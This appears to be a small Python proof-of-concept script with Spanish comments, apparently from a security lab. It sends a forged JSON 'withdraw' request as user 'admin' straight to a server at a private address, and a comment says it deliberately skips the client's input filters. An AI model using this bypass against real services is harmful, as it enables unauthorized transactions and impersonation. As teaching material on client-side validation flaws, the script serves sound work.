import socket
import json

def inyectar_payload(payload):
    atacante = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        atacante.connect(('10.21.215.16', 5000))
        # Enviamos el JSON tal cual, sin pasar por los filtros de cliente.py
        atacante.sendall(json.dumps(payload).encode('utf-8'))
        
        # Esperamos la respuesta
        respuesta = atacante.recv(1024).decode('utf-8')
        print(f"[Servidor responde] -> {respuesta}\n")
    except Exception as e:
        print(f"[Error de conexión/Crash] -> {e}\n")
    finally:
        atacante.close()


inyectar_payload({
    "accion": "retirar", 
    "usuario": "admin", 
    "cantidad": 100
})